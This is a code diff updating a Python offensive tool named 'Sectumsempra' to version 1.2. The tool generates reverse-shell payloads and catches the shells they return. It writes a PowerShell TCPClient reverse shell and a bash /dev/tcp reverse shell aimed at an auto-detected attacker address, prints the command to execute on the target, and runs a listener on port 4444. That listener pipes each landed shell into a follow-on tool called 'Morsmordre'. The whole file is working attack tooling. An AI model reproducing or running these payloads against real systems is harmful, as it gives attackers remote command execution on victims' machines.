@@ -1,18 +1,19 @@
 #!/usr/bin/env python3
 """
-Sectumsempra v1.1 - Green Engine
-Async Socket Listener with Tool 3 Handoff
+Sectumsempra v1.2 - Green Engine
+Async Socket Listener with Proper Morsmordre Handoff
 """
 
 import asyncio
 import argparse
 import json
 import os
-import socket
 import sys
+import subprocess
+import socket
 from pathlib import Path
 from typing import Optional, Dict, Any
-import subprocess
+import time
 
 try:
     from rich.console import Console
@@ -29,35 +30,37 @@ class Sectumsempra:
         self.target_os: str = "Linux"
         self.target_ip: str = ""
         self.contract_file: Optional[str] = None
+        self.morsmordre_proc = None
         
     def banner(self):
         if self.console:
             self.console.print(Panel.fit(
-                "[bold green]Sectumsempra v1.1 - Green Engine[/bold green]",
-                subtitle="[green]The Handoff Protocol[/green]",
+                "[bold green]Sectumsempra v1.2 - Green Engine[/bold green]",
+                subtitle="[green]The Bridge Protocol[/green]",
                 border_style="green"
             ))
         else:
-            print("\033[92m>>> Sectumsempra v1.1 - Green Engine <<<\033[0m")
+            print("\033[92m>>> Sectumsempra v1.2 - Green Engine <<<\033[0m")
     
     def status(self, msg: str, level: str = "info"):
+        ts = time.strftime("%H:%M:%S")
         indicators = {
             "info": "[*]", "success": "[+]", "warning": "[!]", 
-            "error": "[-]", "handoff": "[»]"
+            "error": "[-]", "handoff": "[»]", "shell": "[SHELL]"
         }
         ind = indicators.get(level, "[*]")
         
         if self.console:
             color = {"info": "blue", "success": "green", "warning": "yellow", 
-                    "error": "red", "handoff": "magenta"}.get(level, "white")
-            self.console.print(f"[{color}]{ind} {msg}[/{color}]")
+                    "error": "red", "handoff": "magenta", "shell": "red"}.get(level, "white")
+            self.console.print(f"[{color}]{ind} [{ts}] {msg}[/{color}]")
         else:
             colors = {"info": "\033[94m", "success": "\033[92m", 
-                     "warning": "\033[93m", "error": "\033[91m", "handoff": "\033[95m"}
-            print(f"{colors.get(level, '')}{ind} {msg}\033[0m")
+                     "warning": "\033[93m", "error": "\033[91m", 
+                     "handoff": "\033[95m", "shell": "\033[91m"}
+            print(f"{colors.get(level, '')}{ind} [{ts}] {msg}\033[0m")
     
     def find_tun0(self) -> str:
-        """Auto-detect VPN interface"""
         try:
             import netifaces
             if 'tun0' in netifaces.interfaces():
@@ -67,7 +70,6 @@ class Sectumsempra:
         except:
             pass
         
-        # Fallback to ip command
         try:
             result = subprocess.run(
                 ["ip", "addr", "show", "tun0"], 
@@ -83,11 +85,9 @@ class Sectumsempra:
         return "0.0.0.0"
     
     def load_contract(self, filename: Optional[str] = None) -> Dict:
-        """Load NetWeave contract"""
         if filename:
             self.contract_file = filename
         else:
-            # Auto-find latest
             files = sorted(Path('.').glob('netweave_*.json'))
             if not files:
                 self.status("No contract found", "error")
@@ -99,92 +99,123 @@ class Sectumsempra:
         
         self.target_ip = data.get('target', '')
         self.target_os = data.get('operating_system', 'Linux')
-        self.status(f"Contract loaded: {self.contract_file}", "success")
+        self.lport = 4444  # Could be configurable
+        
+        self.status(f"Contract: {self.contract_file}", "success")
         self.status(f"Target: {self.target_ip} | OS: {self.target_os}", "info")
         return data
     
     def generate_payload(self) -> str:
-        """Generate OS-appropriate stager"""
         self.lhost = self.find_tun0()
-        self.status(f"LHOST auto-detected: {self.lhost}", "success")
+        self.status(f"LHOST: {self.lhost}", "success")
         
-        if self.target_os == "Windows":
-            # PowerShell reverse shell
-            payload = f"""$client = New-Object System.Net.Sockets.TCPClient("{self.lhost}",{self.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
+        if "Windows" in self.target_os:
+            payload = f"""powershell -c "$client = New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""""
             filename = f"payload_windows_{self.target_ip.replace('.', '_')}.ps1"
+            display = f"powershell -ExecutionPolicy Bypass -File {filename}"
         else:
-            # Linux bash reverse shell
-            payload = f"""bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"""
+            # Linux bash
+            payload = f"""bash -c 'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1'"""
             filename = f"payload_linux_{self.target_ip.replace('.', '_')}.sh"
+            display = f"bash {filename}"
         
         with open(filename, 'w') as f:
             f.write(payload)
         
         os.chmod(filename, 0o755)
-        self.status(f"Payload generated: {filename}", "success")
+        self.status(f"Payload: {filename}", "success")
+        self.status(f"Execute on target: {display}", "info")
         return filename
     
-    async def handle_connection(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
-        """Handle incoming shell - THE HANDOFF TO TOOL 3"""
+    async def bridge_to_morsmordre(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
+        """Bridge the socket to Morsmordre subprocess"""
         addr = writer.get_extra_info('peername')
-        self.status(f"SHELL LANDED from {addr[0]}:{addr[1]}", "handoff")
+        self.status(f"SHELL LANDED from {addr[0]}:{addr[1]}", "shell")
         
-        # Create socket descriptor for Tool 3
-        sock = writer.get_extra_info('socket')
-        
-        # Launch Morsmordre (Tool 3) with the active socket
-        # We pass the socket via environment variable or stdin
+        # Set environment for Morsmordre
         env = os.environ.copy()
-        env['MORSMORDRE_SOCK'] = str(sock.fileno())
         env['MORSMORDRE_TARGET'] = self.target_ip
         env['MORSMORDRE_OS'] = self.target_os
+        env['MORSMORDRE_LHOST'] = self.lhost
+        env['MORSMORDRE_LPORT'] = str(self.lport)
         
-        self.status("Initiating handoff to Morsmordre...", "handoff")
+        self.status("Handing off to Morsmordre...", "handoff")
         
-        # Option 1: Exec Morsmordre inline (replaces this process)
-        # os.execve('./morsmordre.py', ['morsmordre'], env)
-        
-        # Option 2: Async handoff - spawn Morsmordre and pipe the connection
+        # Create Morsmordre process with stdin/stdout connected to our socket
         proc = await asyncio.create_subprocess_exec(
             sys.executable, 'morsmordre.py',
-            stdin=reader,  # Pipe shell output to Tool 3
-            stdout=writer,  # Pipe Tool 3 commands to shell
+            stdin=asyncio.subprocess.PIPE,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
             env=env
         )
         
-        await proc.wait()
-        writer.close()
-        await writer.wait_closed()
+        # Create tasks to bridge data between socket and process
+        async def socket_to_proc():
+            """Read from socket, write to Morsmordre stdin"""
+            try:
+                while True:
+                    data = await reader.read(4096)
+                    if not data:
+                        break
+                    proc.stdin.write(data)
+                    await proc.stdin.drain()
+            except asyncio.CancelledError:
+                pass
+            except Exception as e:
+                self.status(f"Socket bridge error: {e}", "error")
+        
+        async def proc_to_socket():
+            """Read from Morsmordre stdout, write to socket"""
+            try:
+                while True:
+                    data = await proc.stdout.read(4096)
+                    if not data:
+                        break
+                    writer.write(data)
+                    await writer.drain()
+            except asyncio.CancelledError:
+                pass
+            except Exception as e:
+                self.status(f"Proc bridge error: {e}", "error")
+        
+        # Run both directions concurrently
+        try:
+            await asyncio.gather(
+                socket_to_proc(),
+                proc_to_socket()
+            )
+        except Exception as e:
+            self.status(f"Bridge failed: {e}", "error")
+        finally:
+            proc.terminate()
+            writer.close()
+            await writer.wait_closed()
+            self.status("Session closed", "warning")
     
     async def start_listener(self):
-        """Async socket server"""
         server = await asyncio.start_server(
-            self.handle_connection, '0.0.0.0', self.lport
+            self.bridge_to_morsmordre, '0.0.0.0', self.lport
         )
         
-        self.status(f"Listener bound: 0.0.0.0:{self.lport}", "success")
-        self.status("Awaiting shell...", "info")
+        self.status(f"Listener: 0.0.0.0:{self.lport}", "success")
+        self.status("Waiting for shell...", "info")
         
         async with server:
             await server.serve_forever()
     
     def run(self, contract_file: Optional[str] = None):
         self.banner()
-        
-        # Load context
-        contract = self.load_contract(contract_file)
-        
-        # Generate stager
+        self.load_contract(contract_file)
         self.generate_payload()
         
-        # Start listener with handoff capability
         try:
             asyncio.run(self.start_listener())
         except KeyboardInterrupt:
-            self.status("Listener terminated", "warning")
+            self.status("Terminated", "warning")
 
 def main():
-    parser = argparse.ArgumentParser(description='Sectumsempra v1.1 - The Handoff')
+    parser = argparse.ArgumentParser(description='Sectumsempra v1.2 - The Bridge')
     parser.add_argument('--contract', help='NetWeave JSON contract')
     args = parser.parse_args()
     
